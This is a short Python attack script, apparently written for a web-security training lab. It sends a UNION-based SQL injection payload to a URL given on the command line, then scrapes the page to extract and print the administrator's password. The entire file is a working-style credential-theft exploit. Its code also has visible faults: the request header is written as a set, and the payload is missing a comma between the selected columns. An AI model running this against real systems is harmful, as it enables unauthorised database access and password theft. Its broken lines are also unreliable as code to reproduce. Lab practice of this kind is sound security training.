import sys
import requests
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={'http':'http://127.0.0.1:8080',
          'https': 'http://127.0.0.1:8080'}
header={'user-agent:Mozilla/5.0'}

def sqli_user_table(url):
    payload = " 'UNION+SELECT+username+password+from+users-- "
    r = requests.get(url+payload,headers=header,proxies=proxies,verify=False)
    res = r.text
    if 'administrator' in res:
        print("Found the administrator password")
        parse= BeautifulSoup(res,'html.parser')
        admin_password = parse.body.find(text='administrator').parent.findNext('td').contents[0]
        print(f"the admin password is {admin_password}")
        return True
    else:
        return False
    
if __name__== "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("Usage: python script.py <url>")
        sys.exit(-1)
    if not sqli_user_table(url):
        print("The sqli Union attack to retrieve the administrator details is invalid")


